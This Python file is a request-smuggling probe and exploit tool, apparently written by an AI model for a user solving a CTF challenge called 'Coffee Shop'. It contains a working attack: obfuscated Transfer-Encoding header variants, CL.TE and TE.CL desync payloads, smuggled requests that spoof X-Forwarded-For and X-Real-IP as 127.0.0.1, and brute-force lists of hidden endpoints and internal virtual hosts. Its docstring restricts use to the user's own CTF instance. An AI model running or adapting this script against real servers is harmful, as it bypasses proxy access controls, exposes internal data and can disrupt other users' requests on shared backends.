#!/usr/bin/env python3
"""
Coffee Shop (HI Cyber Con 2026) — HTTP request-smuggling probe & exploit helper.

Run this from YOUR machine (direct connection to the live instance), because it
needs raw byte-level control of the HTTP/1.1 stream that a sandboxed/proxied
environment can't provide.

Theory of the bug (to verify): the "head roaster's private after-hours ledger"
is an endpoint the PHP app serves only to "internal" requests (it trusts a
header like X-Forwarded-For / X-Real-IP, or REMOTE_ADDR). The instancer
front-proxy rewrites/strips those headers on normal traffic, so you get
"Not found" externally. If the front (proxy) and back (Apache 2.4.69) disagree
on request boundaries (CL.TE / TE.CL desync), we can smuggle a second request
carrying our OWN internal headers straight to Apache and read the ledger.

Usage:
  # 1) Detect a desync (spin a FRESH instance first, pass its host):
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net detect

  # 2) If a desync is found, smuggle requests to candidate ledger routes:
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net exploit CL.TE
  python3 smuggle_probe.py the-coffee-shop-XXXX.chall.hiddeninvestigations.net exploit TE.CL

  # Optional: probe one explicit smuggled target line, e.g.:
  python3 smuggle_probe.py <host> exploit CL.TE "/?api=ledger"

Paste the full output back to me and we iterate.

NOTE: only run against your own CTF instance. Smuggling can disturb other
requests on a shared backend; a per-user CTF instance is fine.
"""
import socket, ssl, sys, time

PORT = 443
TIMEOUT = 12          # seconds; a hung backend (desync) shows up as ~TIMEOUT
TRIALS = 3            # repeat timing tests to average out jitter

# ---- header-obfuscation variants to make front & back disagree on TE ----
# Each is a (label, Transfer-Encoding header line) pair.
TE_VARIANTS = [
    ("plain",        "Transfer-Encoding: chunked"),
    ("space-before", "Transfer-Encoding : chunked"),
    ("tab",          "Transfer-Encoding:\tchunked"),
    ("leading-sp",   " Transfer-Encoding: chunked"),
    ("vtab",         "Transfer-Encoding:\x0bchunked"),
    ("x-prefix",     "X: X\r\nTransfer-Encoding: chunked"),
    ("dup",          "Transfer-Encoding: cow\r\nTransfer-Encoding: chunked"),
    ("nl-value",     "Transfer-Encoding:\nchunked"),
    ("caps",         "Transfer-Encoding: CHUNKED"),
]

def connect(host, alpn_h1_only=True):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Force HTTP/1.1 at the TLS layer; if the front only offers h2 this still
    # usually falls back to h1 for our raw bytes.
    try:
        ctx.set_alpn_protocols(["http/1.1"] if alpn_h1_only else ["h2", "http/1.1"])
    except NotImplementedError:
        pass
    raw = socket.create_connection((host, PORT), timeout=TIMEOUT)
    s = ctx.wrap_socket(raw, server_hostname=host)
    return s

def send_recv(host, payload, read_timeout=TIMEOUT):
    """Send raw bytes, return (elapsed_seconds, response_bytes, negotiated_alpn)."""
    s = connect(host)
    alpn = s.selected_alpn_protocol()
    s.settimeout(read_timeout)
    start = time.time()
    s.sendall(payload)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            # stop early once we clearly have a full first response
            if b"\r\n\r\n" in data and len(data) > 0 and b"HTTP/1." in data[:16]:
                # try to read a bit more but don't block long
                s.settimeout(1.5)
    except (socket.timeout, ssl.SSLError):
        pass
    except Exception:
        pass
    elapsed = time.time() - start
    try: s.close()
    except Exception: pass
    return elapsed, data, alpn

def clte_payload(host, te_line):
    # Front uses Content-Length(=4) -> forwards "1\r\nA"; back uses TE ->
    # reads chunk '1'/'A' then waits forever for the next chunk => delay.
    body = "1\r\nA\r\nX"
    hdr = (f"POST / HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"{te_line}\r\n"
           f"Content-Length: 4\r\n"
           f"Connection: keep-alive\r\n\r\n")
    return (hdr + body).encode()

def tecl_payload(host, te_line):
    # Front uses TE -> ends body at "0\r\n\r\n"; back uses Content-Length(=6)
    # -> waits for 6 bytes it never fully gets => delay.
    body = "0\r\n\r\nX"
    hdr = (f"POST / HTTP/1.1\r\n"
           f"Host: {host}\r\n"
           f"{te_line}\r\n"
           f"Content-Length: 6\r\n"
           f"Connection: keep-alive\r\n\r\n")
    return (hdr + body).encode()

def baseline(host):
    body = "x"
    p = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {len(body)}\r\n"
         f"Connection: keep-alive\r\n\r\n{body}").encode()
    times = []
    alpn = None
    for _ in range(TRIALS):
        t, d, alpn = send_recv(host, p)
        times.append(t)
    return min(times), alpn

def detect(host):
    print(f"[*] Target: {host}:{PORT}")
    base, alpn = baseline(host)
    print(f"[*] Negotiated ALPN: {alpn or '(none / http1.1)'}")
    print(f"[*] Baseline response time: {base:.2f}s")
    if alpn == "h2":
        print("[!] Front negotiated HTTP/2 even though we asked for http/1.1.")
        print("    Classic CL.TE/TE.CL may not apply; h2-downgrade smuggling may be needed.")
    print(f"[*] A variant is INTERESTING if its time >> baseline (approaching {TIMEOUT}s).\n")
    findings = []
    for kind, mk in (("CL.TE", clte_payload), ("TE.CL", tecl_payload)):
        for label, te in TE_VARIANTS:
            best = min(send_recv(host, mk(host, te))[0] for _ in range(TRIALS))
            flag = "  <<< POSSIBLE DESYNC" if best > base + 4 and best > 5 else ""
            print(f"  [{kind:5}] {label:12} {best:5.2f}s{flag}")
            if flag:
                findings.append((kind, label, te, best))
        print()
    if findings:
        print("[+] Candidate desyncs found:")
        for kind, label, te, t in findings:
            print(f"    {kind} via '{label}'  ({t:.2f}s)  TE line: {te!r}")
        print("\n    Next: run  exploit <KIND>  to smuggle ledger-route requests.")
    else:
        print("[-] No timing desync detected. The bug is probably NOT request smuggling;")
        print("    tell me and we'll pivot (likely needs the challenge source).")
    return findings

# candidate hidden/internal endpoints to try via the smuggled request
CANDIDATES = [
    # hidden API routes (internal-only?)
    "/?api=ledger", "/?api=orders", "/?api=order&all=1", "/?api=order&list=1",
    "/?api=admin", "/?api=roaster", "/?api=books", "/?api=daybook",
    "/?api=audit", "/?api=report", "/?api=afterhours", "/?api=after-hours",
    "/?api=ledger&after_hours=1", "/?api=eod", "/?api=closing", "/?api=night",
    "/?api=all", "/?api=export", "/?api=dump", "/?api=debug",
    # path-based (front may hide these; backend may serve)
    "/ledger", "/roaster", "/admin", "/internal", "/books", "/daybook",
    "/ledger.php", "/roaster.php", "/admin.php", "/after-hours",
    # flag file (in case the <Files> deny is front-only / IP-conditional)
    "/flag.txt", "/flag", "/README.md", "/.git/config",
]

def split_responses(data):
    """Split a byte stream into individual HTTP/1.x responses."""
    txt = data.decode("latin1", "replace")
    parts, idx = [], 0
    while True:
        nxt = txt.find("HTTP/1.", idx + 1)
        if nxt == -1:
            parts.append(txt[idx:]); break
        parts.append(txt[idx:nxt]); idx = nxt
    return [p for p in parts if p.startswith("HTTP/1.")]

def build_smuggled(host, smuggled_request_line, te_line, extra_headers="", host_header=None):
    """The request Apache parses directly. host_header overrides Host so we can
    reach a *different backend vhost* (the front's Host-routing is bypassed)."""
    hh = host_header if host_header is not None else host
    return (f"{smuggled_request_line} HTTP/1.1\r\n"
            f"Host: {hh}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"X-Real-IP: 127.0.0.1\r\n"
            f"{extra_headers}"
            f"Content-Length: 0\r\n\r\n")

def smuggle_raw(host, kind, smug, te_line="Transfer-Encoding: chunked"):
    """Send a CL.TE/TE.CL smuggle carrying the raw request string `smug`."""
    if kind == "CL.TE":
        body = "0\r\n\r\n" + smug
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n{te_line}\r\n"
                   f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n{body}").encode()
    else:
        chunk_hdr = f"{len(smug):x}\r\n"
        body = chunk_hdr + smug + "\r\n0\r\n\r\n"
        payload = (f"POST / HTTP/1.1\r\nHost: {host}\r\n{te_line}\r\n"
                   f"Content-Length: {len(chunk_hdr)}\r\nConnection: keep-alive\r\n\r\n{body}").encode()
    _, d, _ = send_recv(host, payload, read_timeout=8)
    return split_responses(d)

def smuggle_once(host, kind, smuggled_request_line, te_line="Transfer-Encoding: chunked"):
    """
    CL.TE: front uses Content-Length (forwards whole body), back uses chunked.
    Body = '0\\r\\n\\r\\n' (empty chunked body => back ends request here) followed
    by the smuggled request, which Apache then parses as the NEXT request.
    We read both responses; the 2nd is the smuggled one.
    """
    smug = build_smuggled(host, smuggled_request_line, te_line)
    if kind == "CL.TE":
        body = "0\r\n\r\n" + smug
        payload = (f"POST / HTTP/1.1\r\n"
                   f"Host: {host}\r\n"
                   f"{te_line}\r\n"
                   f"Content-Length: {len(body)}\r\n"
                   f"Connection: keep-alive\r\n\r\n"
                   f"{body}").encode()
    else:  # TE.CL : front uses chunked, back uses CL
        # chunk contains the smuggled request; back's CL is small so it stops
        # early and leaves the rest as the next request.
        chunk_hdr = f"{len(smug):x}\r\n"
        body = chunk_hdr + smug + "\r\n0\r\n\r\n"
        payload = (f"POST / HTTP/1.1\r\n"
                   f"Host: {host}\r\n"
                   f"{te_line}\r\n"
                   f"Content-Length: {len(chunk_hdr)}\r\n"
                   f"Connection: keep-alive\r\n\r\n"
                   f"{body}").encode()
    t, d, _ = send_recv(host, payload, read_timeout=8)
    return split_responses(d)

import re
def show(resps):
    """Return (smuggled_response_text, interesting_bool)."""
    if not resps:
        return "(no response)", False
    # response[0] = the POST / carrier (homepage); response[1+] = smuggled
    smug = resps[1] if len(resps) > 1 else resps[0]
    return smug, True

def exploit(host, kind, only=None):
    print(f"[*] Smuggling via {kind} against {host}\n")
    targets = [only] if only else CANDIDATES
    flags = set()
    for tgt in targets:
        try:
            resps = smuggle_once(host, kind, "GET " + tgt)
            n = len(resps)
            smug = resps[1] if n > 1 else (resps[0] if n else "")
            status = smug.split("\r\n", 1)[0] if smug else "(none)"
            # body preview
            body = smug.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in smug else smug
            body = body.strip()[:280].replace("\r", "")
            interesting = any(k in smug for k in ("HI{", "hi{", "flag", "ledger",
                               '"ok"', "token", "authorization", "Authorization", "roaster"))
            mark = "  <<< INTERESTING" if interesting else ""
            print(f"=== GET {tgt}  [{n} resp(s)]  smuggled-status: {status}{mark}")
            if body:
                print("    " + body.replace("\n", "\n    "))
            for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", smug):
                flags.add(m)
            print()
        except Exception as e:
            print(f"=== {tgt} === error: {e}\n")
    if flags:
        print(">>> POSSIBLE FLAG(S):")
        for f in flags: print("   ", f)
    print("\n[*] Done. Paste everything above back to me.")
    print("[*] If every target shows only 1 response (the homepage) and no smuggled")
    print("    status line, tell me — I'll adjust the chunk framing/offsets.")

# candidate internal-vhost Host headers (front routes by Host; smuggling bypasses that)
VHOSTS = [
    "localhost", "127.0.0.1", "ledger", "ledger.local", "ledger.internal",
    "roaster", "roaster.local", "headroaster", "admin", "admin.local",
    "internal", "internal.local", "backend", "private", "books",
    "after-hours", "afterhours", "ember-oak", "emberoak", "ember-and-oak",
    "ledger.ember-oak", "ledger.emberoak", "ledger.ember-and-oak",
    "roaster.ember-oak", "ledger.stillwell", "ledgers", "the-ledger",
    "coffee", "shop", "ember", "oak",
]
VHOST_PATHS = ["/", "/?api=ledger", "/ledger", "/flag.txt", "/?api=menu"]

def summarize(resp):
    if not resp: return "(none)", "", 0
    status = resp.split("\r\n", 1)[0]
    body = resp.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in resp else ""
    # title or first json/text
    m = re.search(r"<title>([^<]+)</title>", body)
    tag = m.group(1) if m else body.strip()[:80].replace("\n"," ")
    return status, tag, len(body)

def vhost(host, kind):
    print(f"[*] Fuzzing smuggled Host header via {kind} against {host}")
    print(f"[*] Looking for a vhost whose response DIFFERS from the coffee shop / 404.\n")
    # baseline: smuggle GET / with the real host
    base = smuggle_raw(host, kind, build_smuggled(host, "GET /", "", host_header=host))
    b_status, b_tag, b_len = summarize(base[1] if len(base)>1 else (base[0] if base else ""))
    print(f"[baseline Host:{host[:30]}..]  {b_status} | len {b_len} | {b_tag[:60]}\n")
    flags=set()
    for vh in VHOSTS:
        smug = build_smuggled(host, "GET /", "", host_header=vh)
        resp = smuggle_raw(host, kind, smug)
        smug_resp = resp[1] if len(resp)>1 else (resp[0] if resp else "")
        status, tag, ln = summarize(smug_resp)
        diff = ""
        if ("Ember" not in tag and "instancer" not in tag and "HI Cyber" not in tag
                and status and "404" not in status) or abs(ln-b_len)>50:
            diff = "  <<< DIFFERENT"
        print(f"[Host: {vh:28}] {status:22} len {ln:6} | {tag[:50]}{diff}")
        for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", smug_resp):
            flags.add(m)
        if diff:
            # drill into interesting vhost with more paths
            for p in VHOST_PATHS[1:]:
                r2 = smuggle_raw(host, kind, build_smuggled(host, "GET "+p, "", host_header=vh))
                sr = r2[1] if len(r2)>1 else ""
                s2,t2,l2 = summarize(sr)
                print(f"      -> {p:20} {s2:22} len {l2} | {t2[:50]}")
                for m in re.findall(r"[A-Za-z0-9_]{1,12}\{[^}]{3,120}\}", sr):
                    flags.add(m)
    if flags:
        print("\n>>> POSSIBLE FLAG(S):")
        for f in flags: print("   ", f)
    print("\n[*] Done. Paste everything above back to me.")

def main():
    if len(sys.argv) < 3:
        print(__doc__); sys.exit(1)
    host = sys.argv[1].replace("https://", "").replace("http://", "").rstrip("/")
    mode = sys.argv[2]
    kind = sys.argv[3] if len(sys.argv) > 3 else "CL.TE"
    if mode == "detect":
        detect(host)
    elif mode == "exploit":
        only = sys.argv[4] if len(sys.argv) > 4 else None
        exploit(host, kind, only)
    elif mode == "vhost":
        vhost(host, kind)
    else:
        print("mode must be 'detect', 'exploit', or 'vhost'"); sys.exit(1)

if __name__ == "__main__":
    main()
